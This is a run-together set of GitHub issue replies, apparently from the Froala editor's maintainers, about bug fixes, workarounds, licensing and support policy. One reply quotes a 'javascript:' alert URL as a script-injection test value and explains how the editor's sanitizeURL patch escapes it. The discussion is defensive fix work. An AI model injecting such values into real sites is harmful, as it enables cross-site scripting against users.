Fixed in https://github.com/stefanneculai/froala-wysiwyg/commit/54d59ec20ca8271b1860663de0cbc4a34487aa05. Will be on the next minor release (v1.0.5).\n. Should be fixed by the commit dd9f9e8725324d49eaf7196e2aa5830a823255c4. Could you check, please?\nThanks!\n. Fixed in v1.0.5.\n. What browser are you using?

Could you put here the code you are using? Also please check it with the code from the archive and documentation.\n. Please follow http://editor.froala.com/docs/image-upload-php.\n. We may add in it a further release (few months from now).\n. We're releasing a new version today with improved support for images.\n. Thanks for the suggestion. We'll take into consideration.\n. fe9065701347a7bdd2b0b930514ebf9818e14101 adds it in. Documentation will come together with the new release very shortly.\n. http://editor.froala.com/concepts/file-upload\nhttp://editor.froala.com/server-integrations/php-file-upload\n. The problem is on your server and not in editor. I've answered to it via email.\n. We have support for events, only that they are not documented yet. Could you use the contact form to explain what you need so that I can give you the details for what you need? Also you can use the email addresses from the confirmation mail that you have received.\n\nWe have planned to release the next version on March 10. It will have a new feature for passing additional parameters on save (it is currently under development) and we will document the callback events too. Also, because you have bought a license, you will have the option to download the unminified sources.\n. Froala Editor is not an open source project. The main purpose of keeping this repo is to allow our users to easily report issues they encounter. \nThe non-minified sources will be available only for the paid licenses starting with March 10. Also, starting with March 10, there will be the non-minified css files for all our users (including Github).\n. Please note that if you want to integrate Froala Editor into your Open Source project, then all your users will need a license for it, unless you buy a custom OEM license.\n. Could you use the Github markdown to paste the code? It's hard to follow otherwise. See Fenced Blocks from https://help.github.com/articles/github-flavored-markdown. Thanks.\n. I just tried your code and it works to me. Are you sure that JS files are loaded fine?\nPS: Sorry for my late response, I did not notice that you edited the comment.\n. We know about it. We'll release in a few hours a new version and it will have this fixed.\n. Fixed on tree \"Release 1.1.0 alpha\" a24105857e1922145b5342e568b0dfa58028594a\n. I can confirm that it works on IE 10. You may experience a browser cache issue. \n. I tested it using BrowserStack. They are also using virtual machines for that. I'm certain it is a problem with that specific VM and not with the editor.\nI think it is related to How to get fontawesome to work on an Azure web pages deployment?.\n. What do you mean by \"auto-focusing function\"?\n. Yes. We know about it. There will be a minor release today to fix it.\n. Fixed on 2437a471bb09c5f8eab8623e1dc7de2faba121af\n. Fixed in be2aa4abc99a26d7fd6b2a7c52a1e8715b11efb4\n. Thanks for the suggestion. We're always looking forward to make the integration of Froala Editor easier. That's why we already created a gem for Ruby and a plugin for PHPCake.\n. Done.\n. Indeed it cleans the HTML and removes those <br/>. We will make a new minor release this week and we'll fix that.\n. We'll update the repo from here during today with a fix for that.\n. Please try the sources from 0ffb27e13c8eefedabf135f4283e2abd8e0d7883. Let me know if you still have the problem.\n. We keep this repo for specific purposes as it is written in the read me. It is not for tech support:\n4) For feature requests, tech support and general discussion, don't use GitHub Issues. See http://editor.froala.com/contact for the appropriate channels.\n. We are supporting IE9+ and we don't not plan to offer support for lower IE versions at all. Lower versions than IE9 do not have any kind of HTML5 support and also the number of IE8 users is getting lower and lower.\n. Indeed. We're going to fix it.\n. Fixed in 90e72bee5964d79d44d721ca760ad8631d504645\n. Changing the z-index of .froala-editor to 2000 fixes the issue. http://jsfiddle.net/w4EmN/9/\n. Setting zIndex option to a high value should work.

The problem is that Twitter Bootstrap Modal is stealing the focus event. Turning that off when the modal appears will allow you to focus on the inputs from the editor popup. See http://jsbin.com/figidajo/1\n. We may add it in the future, but it is not our highest priority at this point.\n. I can confirm it. We'll fix it in a release during this week.\n. Fixed in 90e72bee5964d79d44d721ca760ad8631d504645\n. It's because of the z-index. It is not a bug. Setting z-index to 2000 should solve your problem. See #22.\n. Could you please paste the code here? It would be easier for us to replicate the issue. Thanks!\n. Fixed in 90e72bee5964d79d44d721ca760ad8631d504645\n. We'll add in support for Font Awesome icons into the editor soon. It is already on our Feature list.\n. What version are you using?\n. OK. I can confirm the issue. We'll do a release next week and it will be fixed.\n.

Starting with version 1.1.3 the autosave interval is 10000ms. We omitted to update it in documentation. It's updated now.\n. I will put an update during today for that. Thanks for pointing that out.\n. @outluch try a83c870910d402728148e72b84b420bc213c0253. It will trigger the contentChanged callback each time there is a change being done and not before saving at it was doing before.\n. When is the callback not fired?\nWhy do you say that you see autosave being fired when you hit backspace? Autosave is fired on the interval set by autoSave. Intervals smaller than 1000ms are not accepted.\n. I see what is confusing you. Have a look at the option typingTimer. \ntypingTimer determines how quick the changes between typing should be recorded. By default, typingTimer is set to 200ms and it cannot be set to a smaller value. For example if you press \"a\" and then under 200ms you type \"b\", it will record the change as being \"ab\" and it will not record each letter as a change. typingTimer affects both contentChanged callback and autosave and they won't be triggered if the changed hasn't been recorded. Does it make sense?\n. @JoshMcCullough the contentChanged event is triggered after the typingTimer option when you type inside the editor. If you want to get the latest changes there in your external save button, then you could use the html.get method.. The returned path is not the OK one. You'd have to make sure that the image can be loaded. When the image link is returned, it will look like /uploads/00842478c9c71acb8e7c339592ab9f9febf00c2c.png. This will look for the image on http://www.thaihondacityclub.com/uploads/00842478c9c71acb8e7c339592ab9f9febf00c2c.png which doesn't seem to be the right path.\nI am closing this because it is not an issue with the editor but a programming issue on your end. \n. Thanks for pointing that out. We'll fix it shortly.\n. Not yet. We'll update this repo in a few days with a pre-release for version 1.1.4 and it will have a fix for this too.\n. Please look over 7d7a7eb77b8eb519e38190a979faed60b55cd197\n. Sorry but the source code is minified so I can't tell you a line.\n. javascript:alert%28location%29 is escaped to javascript%3Aalert%2528location%2529 that doesn't make it possible to execute the code anymore.\n. Yes, that commit fixes data and vbscript too.\n. You can look over the method b.prototype.sanitizeURL. \n. Exactly.\n. Right. Please look over 8a2120d9da0abba72d0279a4109c900db0d12866, same method.\nPS: I really appreciate your help. If there is anything else just let me know.\n. We update the demo page only when there is a new release. This version is not ready for release yet. You could download the archive from Github and use the examples folder https://github.com/stefanneculai/froala-wysiwyg/archive/master.zip\nAlso, we don't want to limit video insertion. Maybe someone wants to embed a video from Vimeo or other video application. I fixed so that the inputed code is now escaped. If you want to see how, you can look over stripScript and clean methods from the last commit.\n. We're not making public this kind of information yet.\n. 2.5 months since our launch\n5000 downloads directly from our website\n1000 downloads of the rails gem\nThere should be another 1000 more from other sources where the editor is posted.\n. Have you tried this d82640f2baf8777fe00b69b041392cf2a60c12c8 commit? \nPS: Do you have a Skype id? Thanks!\n. I'm closing this as all the reported bugs were fixed. If there will be new ones we can open this issue again.\n. @kimutaiRop do you think you could make a jsFiddle? https://jsfiddle.net/froala/wc5c3jhk/. @oleksandr-dakal are you able to reproduce this on our homepage? How?. @oleksandr-dakal could you please make sure that you're using version 2.9.3?. Fixed in 7d7a7eb77b8eb519e38190a979faed60b55cd197\n. Array is the right way, because the selector matches multiple objects and you have a result for each object. It still returns Array.\n. Yes, the docs have to be updated.\n. It works when you have focus inside the editor. We'll fix it shortly for when there is not focus on the editor. \nIn the meanwhile, you can use the following workaround:\n``` js\n$('#editor').data('fa.editable').$element.focus();\nif (!$('#editor').editable('selectionInEditor')[0]) {\n  $('#editor').editable('setSelection', $('#editor').data('fa.editable').$element.get(0), 0, null, 0)\n}\n$(\"#editor\").editable(\"insertHTML\",\"foo bar\");\n```\n. I assume you run the code when a button is clicked. If you are using the click event then the mouse position is lost. It should work if you do it on mousedown instead of click.\n. The commit f0da489cd993eac3a4f19e7823412d5c141a161c has a fix for this.\nThere is no method to get caret position. To set it you can use setSelection.\n. Added in 7d7a7eb77b8eb519e38190a979faed60b55cd197\n. Indeed the documentation has to be updated. Thanks!\n. Commit 044939627f0d5daf1b5be3deff8b47f72ee3c2cc fixes that. Please use the latest version from this repo.\nThanks for reporting it!\n. Hello,\nWe'll post a tutorial with that on our website during the next week. Basically you have to use beforeRemoveImage callback. I will close this issue once the tutorial will be public.\n. Version 1.1.4 has been just released. afterRemoveImageCallback can be used to delete an image http://editor.froala.com/docs/callbacks#afterRemoveImage. The callback is triggered each time a image is removed from the editor. There will be a tutorial in PHP about removing the image shortly.\n. Here it is: http://editor.froala.com/server-integrations/php-delete-image\n. Indeed it strips the non-ascii characters. There will be a fix for that here shortly.\n. Fixed in b5b6ba4dc2c0606c240375716d119a9ec116965b\n. It was not designed to appear when you select by keyboard. CTRL + F will show the editor if there is selection. \nWe'll consider showing it when you select text by keyboard.\n. ecc4aec0cca3620a73874cbac38fbd57f5ec1385 is enabling this.\n. What version are you using? The editor doesn't get focus when you load the page.\n. Do you have 2 editors on the same page?\nWhat browser are you using?\n. If you can replicate it in a fiddle or provide a link to it I can give you more details. I will close this in the meanwhile.\n. Indeed in happens a textarea is being used. We'll fix it shortly.\n. This issue was in version 1.1.2 and it seems that is back now. I added an unit test for this so that we make sure it won't be back again. Thanks for the example.\nPlease use this code after initialization as a workaround until we update it.\njs\n$('.froala-box').data('fa.editable').$element.blur()\n. Fixed in cae60c0c044bf9a25672d65c1b5eff8871082c6b.\n. You can use noConflict like this:\n``` html\n  \n$.fn.froala_editor = $.fn.editable.noConflict();\n Load X-Editable js files here. \n\n      $(function(){\n          $('#edit').froala_editor({inlineMode: false})\n      });\n  \n```\n. This works very well.\n. Are you using the last versiom from this repo or v1.1.3?\n. I am closing this, since it's fixed in the master version.\n. This is not an issue, but a feature request. I'll leave it open, but I don't think it will be implemented in the next few months.\nThe option buttons is for setting what buttons are enabled into the editor toolbar. It has nothing to do with what is pasted into the editor. \n. Thanks for all the good words about the editor. We kept this issue open because we may add it in the future.\nWhat do you mean by \"he can not see half of it\"?\n. Starting with the latest version from this branch, you can use Editable.prototype.allowed_tags to defined the list of tags you want to allow into the editor. If you want some of the tags to be removed, then you can simply do that by changing this list. If you want to do that only when pasting, you could use the beforePaste and afterPaste to achieve that.\n. !0 is true in Javascript, so d.options.paragraphy===!0 is evaluated to true when you pass paragraphy: true. I can assure you that the problem is not because of the comparison.\nIf you could put here the code you are using, and tell us the browser you're using we can see where the problem is. Also, what version of the editor are you using?\n. !0 is true in Javascript, so d.options.paragraphy===!0 is evaluated to true when you pass paragraphy: true.

Why can't you configure your application to use POST for the save action and need PATCH / PUT?\n. Both of them should have worked. We'll check. Thanks!\n. OK. We'll fix it shortly.\n. Yes, they were removed in favor of data- because they are not valid in HTML5.\n. It is not designed to trigger contentChangedCallback when you call the insertHTML method.

Delete is called only for the Delete button from media manager. You also have to specify imageDeleteURL. If you want to call it when the image is removed then you should call deleteImage method inside the remove callback. See http://plnkr.co/edit/yjz2YvpQDNQPFwjEqNNv?p=preview\n. When you hit the image button, there is a glass icon next to the URL field.\n. We know about it and we have fixed it.

I don't know how Japanese language should work. I tried using a Japanese keyboard but everything looks fine to me. Thanks!\n.

I'm glad you enjoy the editor. You can initialize the editor on multiple HTML elements by using the right selector in jQuery. If you have 2 divs with ids id-1 and id-2 you'd have to initialize the editor like this $('#id-1, #id-2').editable().\nThis repository is used as a bug tracker (please use it appropriately) and technical support is offered only to users who have a paid license via email.\n.

In the meanwhile you could hide that div from CSS as a workaround.\n. Done in d034e2516ceb1132f56246b451fd2e57c64b3eb7. Use option imageLink: false to disable insert image by link.\n. Nice catch! :+1:  We're using loops like for (var i in array) and this is the source of the error. There will be an update here over the next few days.\n. 0e4776e1ce9f0dbb6d323e3e8f3b38ecc9aa90be should fix it. \n. I checked this on our website which uses version 1.1.5 and locally with the version from this repo (v1.1.6 pre-release). Both work fine. I can't replicate the issue.\n. Indeed there is an issue. To fix it until we make the next release, add the following code after you include the JS file for the editor.\n``` js\n$.Editable.prototype.sanitizeURL = function (url) {\n    if (this.options.enableScript) {\n      return url;\n    }\nif (/^https?:\\/\\//.test(url)) {\n  return String(url)\n            .replace(/&/g, '&amp;')\n            .replace(/</g, '&lt;')\n            .replace(/>/g, '&gt;')\n            .replace(/\"/g, '&quot;');\n}\nelse {\n  return encodeURIComponent(url)\n            .replace('%23', '#')\n            .replace('%2F', '/')\n            .replace('%25', '%')\n            .replace('%3A', ':')\n            .replace('%3F', '?')\n            .replace('%3D', '=')\n            .replace('%40', '@');\n}\n\n}\n``\n. It should be$.Editable.prototype.sanitizeURL. I updated it. Also, it's not necessary to put it in$(document).ready`.\n. Right. It should be like this:\n``` js\nEditable.prototype.sanitizeURL = function (url) {\n    if (this.options.enableScript) {\n      return url;\n    }\nif (/^https?:\\/\\//.test(url)) {\n  return String(url)\n            .replace(/&/g, '&amp;')\n            .replace(/</g, '&lt;')\n            .replace(/>/g, '&gt;')\n            .replace(/\"/g, '&quot;');\n}\nelse {\n  return encodeURIComponent(url)\n            .replace(/%23/g, '#')\n            .replace(/%2F/g, '/')\n            .replace(/%25/g, '%')\n            .replace(/%3A/g, ':')\n            .replace(/%3F/g, '?')\n            .replace(/%3D/g, '=')\n            .replace(/%26/g, '&')\n            .replace(/%40/g, '@');\n}\n\n}\n``\n. Use 0e4776e1ce9f0dbb6d323e3e8f3b38ecc9aa90be. You should use the optionsimpleAmpersandin order not to see the&converted into&`. There is also an example for that.\n. Please check eaeb2bfcadd511b08a13754b9ee995eb54a76c49.\n. It's a new feature and we don't have unit tests for it yet. 2290adc0b896dd008287f34df545c71720f3934b fixes that. If you find anything else please let us know. \nThank you for reporting all these issues! :+1: \n. Fixed c2c22818514328def058c6d861fe70138af7daf8\n. Thanks for pointing this out! \nThere is no way at this point to do the customizations you want.\n. Fixed.\n. The version from this repo has this issue fixed some time ago.\n. becba605ae5f6e8f9479746e618bb5aa0ec38690 fixes it.\n. There will be an option in the new release for that.\n. We decided not to add an option but to initialize the editor for image anyway. becba605ae5f6e8f9479746e618bb5aa0ec38690\n. What do you need them for? \n. Added in 53e7dc6593d0596a81e13d5c906045a31f139606\n. It's fixed in dfd5919d97cff6badb79f048501dd422b841b5f3. The rails plugin will be updated when we launch v2.0.0. Though, we updated the master branch with the fix for this.\n. The latest version from this repo has a button to remove background and text color. The colors can be changed in the colors plugin.\n. That would rather be an option that would be set on image directly and not using the blockStyles that are designed for paragraphs.\n. It will definitely be a dropdown. \n. Yes, version 1.2.5 is a step forward for this. We don't have any official example for that, but it is possible.\n. We'll make a special option shortly for customImageDropdown so that dropdowns can be easily added for image, like customDropdowns.\n. 5c89c11d79c0aa91e0fc4c0945336ada88864348 fixes it.\n.

For technical support you should use the contact form from our website.\nIn the archive that you download, there is a folder with examples and all of them include the media manager.\n. I believe you're doing something wrong. I would suggest upgrading to the latest version (1.1.6). There are some changes on the deleteImage method also: http://editor.froala.com/server-integrations/php-delete-image.\nAlso, please notice that this repo is used for bug tracking and not for support. If you need help then you should contact us using the contact form from our website.\n. Please try with the version from this repo. It should not happen anymore.\n. Possible duplicate of #105.\n. We tested and there is no issue with the version from this repo.\n. Thank you for reporting it. We'll check and fix shortly.\n. What browser (name, version) and OS are you using?\n. 1) It makes no sense to save the content while you're editing HTML. Save should be done only wen you're not in HTML mode.\n2) Wrappers are removed when the content is saved. We improved the links and images and now fewer wrappers are used. Your problem should mainly be fixed. Could you please check?\nIE Issue: not tested yet.\n. @rwaters71 The src of the image is being saved if you change it in HTML mode and then switch back. The following list of attributes is saved ('title', 'href', 'alt', 'src', 'style', 'width', 'height', 'target', 'rel', 'name', 'value', 'type', 'colspan', 'rowspan') and all 'data-*' attributes are saved. If you believe there is any other attribute that should be saved and is not here let me know. You should consider disabling the submit button while you're in HTML mode or simulate leaving the HTML mode and then submit the normal form (we'll add shortly this by default in the editor).\n@richoid Give a try to the version from this repo. You will see that the output is cleaner than any other editor. No <font> tags and all styles are merged in a way that you won't get unnecessary tags. The <p><br><p> is necessary for the moment, we may remove it in the future. What do you mean by font sizing? \n. Look at https://www.dropbox.com/s/wnqmv6hwg30q7n1/edit%20src.mov. The editor saves the src when you go back to HTML mode.\nIt makes no sense to save the HTML without the editor interpreting the html input and we'll not change that. If you want such behavior you can customize the editor to work that way. As I said on another issue, there should be no reason why to use the code view (people who use the editor aren't developers - they don't know HTML!!!) or if there is one it should be eliminated.\nI consider this issue closed.\n. a391bca9e6d4a490129e45aad6eea7ab727ad32b closes the HTML view and does a sync when when you're in HTML mode and submit a form.\n. @eneifert if you use the master version it will work fine.\n. @beyondcreed I agree with you that switching to text view when saving is a bad UX. Last commit fixes that and it doesn't switch back to the text view on save. However, it will still do all the cleanup for consistency with the options the editor is initialized with (htmlAllowComments, htmlAllowedAttrs, htmlAllowedTags, etc.).\n. If you're using the editor inside a form then it won't work to have another form tag inside the editor unless you use the iframe: true option.\n. @zvermike Do you think it would be possible to make a jsFiddle to highlight the problem? That would speed-up things a lot. Here is a basic jsFiddle you could use as a starting point: https://jsfiddle.net/froala/wc5c3jhk/.. Indeed, there seems to be an issue when you add options this way. Use the following alternative code until we fix the issue:\njs\n$(\".editable\").editable(\"option\",  \"saveParams\", {\n  exists: artExists,\n  publish: published\n});\n. 1fff1af7930304c59b9691e0d02d408c63ee92c7 fixes it. Please use the latest version from this repo.\n. I don't think end users really know how to use those tags. I think it's best to document it as you suggested.\nThanks!\n. It works in the version 1.2.0 from this repo. If you still face the issue please make a jsFiddle.\n. We'll update formatBlock to support it.\n. 877b669fea24b2aa4a71373185821c98cb5432e4 makes some changes to how format block works. Now the blockTags option looks like below and you can also put there tags like <main>, <section> or <article>. We will update that in documentation together with the official release of version 1.2.3.\njs\n    blockTags: {\n      n: 'Normal',\n      blockquote: 'Quote',\n      pre: 'Code',\n      h1: 'Heading 1',\n      h2: 'Heading 2',\n      h3: 'Heading 3',\n      h4: 'Heading 4',\n      h5: 'Heading 5',\n      h6: 'Heading 6'\n    }\n. Just upgrade to the latest version and your issues should be fixed.\nWe're glad you love the editor.\n. Thanks for reporting it. We'll check and fix it shortly.\nAlso, I want to check with you if you know that you need a license for using the editor on commercial websites.\n. Please also let us know if it happens in all browsers or a specific one.\n. @masda70 Thanks for pointing out the issue. We just fixed it under development and there will be an update here shortly.\n. 1ddb9ad1d9c17fc1ff10901117f93be37a1505df should fix it.\n. Are you using the latest version (v1.1.7)? That warning has nothing to do with the fact that image is not inserted.\n. What Chrome version and OS are you using?\n. I just tested on Mavericks with Chrome Version 36.0.1985.125 and it works. Are you sure that the 2nd image file is not too large? Please test on http://editor.froala.com and let me know if you experience the same issue.\n. Found the issue. We'll fix it and update this repo shortly. \nThanks for reporting it and helping us to replicate it!\n. 56c12ae4897df639060c11b0d662e14f1dc81522 fixes it.\n. We don't have variables named float in our code. However, we use https://github.com/gruntjs/grunt-contrib-uglify to minify the sources which may introduce such ones. We'll check and see where the problem is.\n. 30a1d66431c1049da5f76277eea0e1b99468e07e Fixes it. There will be a new release shortly for it too.\n. What kind of issues do you have when pasting URLs?\n. I am closing this task because we can't replicate the issue and you haven't provided more details. If you can get back to us with more details, we'll open it again.\n. We'll update it. Thanks for reporting it.\n. Fixes on 8a76ad5a22bce6c8c8541299185fdf4d5755f9f7\n. We appreciate a lot your contribution, but we don't merge pull requests. We keep the programming all in house because we test each new feature on many browsers and mobile too (that doesn't include the unit tests that we run). That would be very hard to do if we accept outside contributions.\nI added this on our TODO list and I can assure you it will get into the editor soon.\n. We just introduced a feature that cleans Word pasting. Please use the version from this repo.\n\nOn 01 Aug 2014, at 18:50, Jason Wilson notifications@github.com wrote:\nTo Reproduce bug:\nCopy text from an MS Word Document (used Word 2010 Starter).

Now the methods from the editor work like other built in jQuery methods. We'll update documentation when we make the official release.\n. Duplicate of #118.\n. It doesn't appear because the screen is too small. It's not an issue.\n. It may be caused by a z-index in Froala Editor. We'll check shortly. Thanks for reporting the issue.\n. Could you make a jsFiddle for that? We tried to reproduce it, but without success. Thank you!\n. I am closing this because we can't reproduce the issue.

We'll check shortly.\n. a9425fd7a2a7a8c45a74da9c9625ef6d2d4b3048 fixes it. It should not be called at all when you switch to HTML view.\n. Hi Rajan,\n\nWe offer support via email. I have already answered you by email.\n. You could add a class to the emoticons and use a custom CSS for that.\n. Thanks for reporting this. We'll check and fix it if there is an issue shortly.\n. 1ddb9ad1d9c17fc1ff10901117f93be37a1505df Fixes it.\n. The contenteditable attribute that the editor is built on is new in HTML5. It works in HTML4 but not as well. We are not going to support tags and attributes that were removed in HTML5 and are not recommended by W3C.\nYou should use CSS instead.\n. There is already an issue opened for that #8 . We have it planned for September, but may be delayed a little.\nYes, file upload is mainly just like image upload, with minor changes.\n. Indeed there is an issue. We'll fix it shortly.\n. 1ddb9ad1d9c17fc1ff10901117f93be37a1505df Fixes it.\n. OK. If there are any other elements that you think would go well into the theme LESS file just let us know. \n. Will be added in the 1.2.0 release.\n. 1ddb9ad1d9c17fc1ff10901117f93be37a1505df fixes it.\n. Thanks for reporting it. We'll check shortly.\n. We have fixed this under development and there will be a commit on this repository during today with the fix.\n. 1ddb9ad1d9c17fc1ff10901117f93be37a1505df fixes it.\n. For v1.1.8 we removed the code that was doing focus (not updated here yet). There will be an update later today here with the pre-release for 1.1.8.\nIndeed sync does a bit more than just synchronizing the textarea. We'll update the documentation for it. The main purpose of the sync is to detect changes, reflect them in textarea and callbacks.\n. There will be an update here today. We're mainly updating the docs right now.\nAlso, tracking the blur event on the $element is not ok because it will be triggered when it's not necessary (hitting the bold button for instance will trigger the default JS blur). v1.1.8 will also add in a callback for blur that can be used.\n. For what would you need to attach more than one callback?\n. Makes sense to me. We'll change callbacks to jQuery events.\ninitializedCallback was not documented yet because it's still experimental. \n. The updates will come tomorrow together with the official release. All callbacks are events not, there are also events for focus and blur and the sync method is improved.\n. Could you please make a jsFiddle to reproduce this?\n. It doesn't matter that it is ASP.NET. You can reproduce only the issue using HTML and JS.\n. Sure. It's hard for us to try reproduce the issue only based on your description. Thanks!\n. I tried to reproduce this, but with no success. I am closing this issue. If you can replicate it in a jsFiddle or send us a link to the page where it is not working we will reopen it. It's very possible that the issue you're experience is not related to the editor.\n. We have this fixed in development. We'll update it shortly here.\n. Fixed in 53e7dc6593d0596a81e13d5c906045a31f139606\n. Fixed in 53e7dc6593d0596a81e13d5c906045a31f139606\n. Please give us a link to the Word document you're copying from. Also, are you using the version from this repo or another version of the editor?\n. It might be fixed in 1.1.8 (we release it officially in few hours). Version 1.1.8 adds in cleanup from Word so it's a big possibility that it is already fixed. \n. We just released the version 1.1.8. Please let us know if you experience the same issue with the new release. Thank you!\n. Please try now. The text won't be pasted using RTL, but if you have RTL enabled in the editor, then the paste result should be fine. \n. Either way, the words don't seem to be concatenated anymore.\n. I am closing this because it seems fixed to us. If the issue is still there please let us know.\n. Actually we'll include this in the $.Editable.commands list so that it is easier to handle. \n. no_selection_cmds is no longer required. cmds_without_selection has been renamed to $.Editable.prototype.cmds_without_focus and it can now be easily changed.\n. Duplicate of #106 \n. It was built initially to put the link only on selected text. It makes sense to appear even when there is no selection and insert the link as it is typed. We'll update it shortly.\n. 8e2d4782f1d8f26c5287f28acb48ba9616aa8718 adds this feature in.\n. The actual implementation is a first step to implement #156 feature.

We'll update shortly.\n. Hi Martin,\nPlease try aca66ef2d2022c85c5d114f7fb1b721080e97ee7. It should fix it.\n. Added in.\n. It's not from the Froala Editor.\n. I tested it locally on a similar case and couldn't replicate. Please make a jsFiddle.\n. The span is not removed, the style from A is removed and other style attributes from span. You should consider using a class instead of those style attributes. I'll discuss with the team to see if we find it useful to allow attributes such as padding on span and if we should allow using style for link tags.\nIn your case, it would be more useful to initialize the editor on the <a> tag. There is an example for that in the examples folder from the archive that you can download from our website.\n. You could initialize the editor on different parts. I assume you don't have many of such <a> tags. You can also pass the option http://editor.froala.com/options#initOnClick which will do the initializations only when that part is edited. This way the loading time is reduced when you load the page.\nWe'll discuss about this issue and get back with our thoughts shortly.\n. 81929f50179bcddb429242cb2b741a87fe576743 fixes it.\n. :+1: \n.

Please detail the issue. Also, make sure that you are using the latest version.\n. Indeed there is an issue. Thank your for reporting it.\n. Fixed.\n. The editor is set not to appear on iPhone. On our website we have some custom Javascript that makes it appear on iPhone. We'll fix that.\nWe decided this because there is not enough room on small screens to show the controls. Moreover, when you want to type something, the keyboard appears and having the editor too makes everything cluttered. \n. We updated our website. Also, I see in the video that you're using a simulator. Please notice that using the simulator may not show the same results as when you use a real device.\n. Please contact us via http://editor.froala.com/contact to discuss more about that. Also, make sure you're using the latest version 1.1.9. Thank you!\n. Please send the document you're copying from by email.

The problem was related to a focus issue. The latest commit from here fixes it.\n. https://github.com/froala/wysiwyg-editor/blob/master/examples/custom_buttons.html - there is a button that does something similar.\n. It's the same, you have to use this.setHTML(...). Please notice that this repository is for bug reporting and not for support. For support you should contact us using the form from our website.\n. Please make a jsFiddle. Thanks!\n. Fixed.\n. What browser and OS are you using?\n. d08e860711612d74d870ac266b428f85c06468bb fixes it.\n. That's because when you select everything (ctrl/cmd + A) and then delete the selected text, in Webkit browsers (Chrome, Safari, etc) if there is a heading at the beginning of the text, the heading formatting is kept. After you delete everything and then hit backspace again, the heading formatting will be removed too. There is nothing that can be done for that. \n. There is no such option and we believe that it is not a common feature (you're the first one asking about this so far). Also, the source can be extended for that really easy (if you have purchased license please contact us via http://editor.froala.com/contact for more details).\nThough, we'll keep this issue open and marked as feature-request and in the case there are other people asking for that too, we may implement it.\n. I'm glad there is so so much interest for this feature. We'll add it in shortly.\n. 1bd3985a048c9e4af389b1932ccde70f8fd11465 adds this feature. An example for it: https://github.com/froala/wysiwyg-editor/blob/master/examples/custom_image_buttons.html\n. Please try with the version from this repo and let us know if you experience the same thing. Also, please let us know the Browser and OS you're using.\n. Word paste has been improved a lot in the latest version from this repo: 686d0930faa539963c3cde33b56743384ad08de4. Please use that one.\nIf the text you're copying from Word is very long, then the editor will hang for a very short time because it has to process the entire pasted text.\nI believe that you tried to paste into the empty editor and it was not pasted anything and you had the impression that it hanged. This should be fixed now. Please let us know.\n. 54ca0b2ce6928e575e65b0eb71b1c8e712236bbb should fix it. If there is still an issue please make a recording. We tried this in different scenarios and never encountered issues.\n. That won't fix. There is no convenient way of detecting the ordered lists when pasting from Word.\n. No, it was not working. It was keeping the numbers, but there was no OL created. We're constantly looking to improve this Word pasting so this might be improved in the future.\n. The issue is fixed on the code from this repo (v.1.2.0). It will be released shortly and updated on our website too.\n. ec434ef79a54d1aa8451440a2646a782adbc557f fixes it.\n. The version from current repo supports it.\n. You have to call sync() after setHTML in order to do the placeholder check.\n. Sorry for the event problem that you experienced. We strive not to add new changes that break code while migrating. Unfortunately there was an issue in the version 1.1.9 that had to be fixed and this was the only way. Please refer to documentation for more details: http://editor.froala.com/events#afterSave.\n. We implemented it this way because the image usually doesn't look well when it's inline with the text. Could you please detail for what would you need it like this? Thank you!\nPS: I want to check if you know that for using the editor on commercial websites you need to purchase license.\n. The development repository is private and only our team has access to it. No exceptions are made.\nThe CSS for images was implemented like this on purpose. If you want to override it, then add the following CSS code and you'll get image inline.\n``` css\n.froala-element span.f-img-wrap {\n    display: inline-block !important;\n    vertical-align: bottom !important;\n}\n.froala-element img, \nimg.fr-tag {\n    display: inline-block !important;\n    vertical-align: bottom !important;\n}\n```\nAlso, we're trying to use this repository as a Bug tracker. If you need further support please contact us via  http://editor.froala.com/contact. Thank you!\n. Fixed 78cd47ad31e2be35a86a7635bc910975bc847a82\n. The show and hide buttons work fine. They hide/show the editor when using inlineMode. There is no sense to hide the toolbar when not using inlineMode.\n. Just a head up regarding this. In the version 1.2.7 it is possible to hide/show the toolbar this way:\n- listen to the focus/blur events\n- inside the listener you can get the toolbar using editor.$editor and call the jQuery show/hide methods on it.\n. We'll check the Notepad issue. As about li, the editor is set to add <p> in <li>. We're considering adding an option for disabling that.\n. I just tested that using the latest version from this repo and there is no problem. \n. What browser and OS are you using? \n. I tested on Windows 7 / Google Chrome and it works. I will test shortly on Windows 8 / Google Chrome, but there shouldn't be any difference.\nCould you please make a video for that? Thank you!\n. I tested paste on Windows 8 with Google Chrome and it works fine. Could you please make a video, maybe I can identify the issue this way? Thank you in advance!\n. We can't replicate this in the master branch from this repo, therefore I am closing this issue.\n. We are doing our best to test the editor on mobile devices, but it's impossible to physically test on all of them. We'll try to check this into a simulator and see if we can reproduce the issue. \nWhat browser are you using?\n. We tested this in Android KlatKit and it works. \n. e12f1bbe655f2a2fa3d707fa79fa41136b586342 fixes it. Thanks for reporting the issue!\n. The editor at the top should have zIndex higher than the one at the bottom. See #92 \n. Setting the zIndex for the dropdown wouldn't simply work because it's included in the toolbar which also has a zIndex. However, c930d51aaa6105ce6cb99ddc671924988e44350b fixes it and setting the zIndex is no longer required when 2 editors are used. \n. See issue #176 \n. Please leave us more details about your feature request.\n. I'm closing this because of the lack of details. If you will provide us more details I would be happy to open it.\n. We have in plan to add a feature for limiting the characters number, but we'll add it a bit later.\n. Fixed in 1136ef950452229aaab1abfd46d392e28bfb1f07. Thank you for letting us know about it!\n. d10bbf82bb929eb5943fe61897dffdc576176d43 fixes it.\n. Should be fixed in the latest version from this repo.\n. It's fixed in the latest version from this repo.\n. Added badLink event. e2a5a90ab3ce30fb782c0fc08a2436ad887d592e\n. Makes sense. We'll update it.\n. Fixed 87fa8caec31003517b6199fdfb6086b84ee6cf9c\n. OK. We'll add in a possibility for that.\n. We added in onPaste event that gets the pasted html. If any string is returned that string will be inserted instead of the original one. There is also an example for that https://github.com/froala/wysiwyg-editor/blob/master/examples/events/onPaste.html.\n. We thought of that too and we changed it as part of more updates in 247d1d33f7ff0d572f2773ebfda5f21ca280b335.\n. :+1: \n. Added e2a5a90ab3ce30fb782c0fc08a2436ad887d592e\n. Added e2a5a90ab3ce30fb782c0fc08a2436ad887d592e\n. Duplicate of #189 \n. Duplicate of #189. I've also answered to your email sent to us.\n. It works to edit the text on iPad using the version from this repo. This is the pre-release for the version 1.2.2 that we will release very shortly. \n. There might be something in the DevExtreme-Mobile SPA-Framework that interferes with the editor. Probably they stop the focus / click propagation to the editor somehow. If there is any problem, it is not from us but from the SPA-Framework.\n. Added as shortcutsAvailable. The default list is ['show', 'bold', 'italic', 'underline', 'createLink', 'insertImage', 'selectAll', 'indent',  'outdent', 'html', 'formatBlock n', 'formatBlock h1', 'formatBlock h2', 'formatBlock h3', 'formatBlock h4', 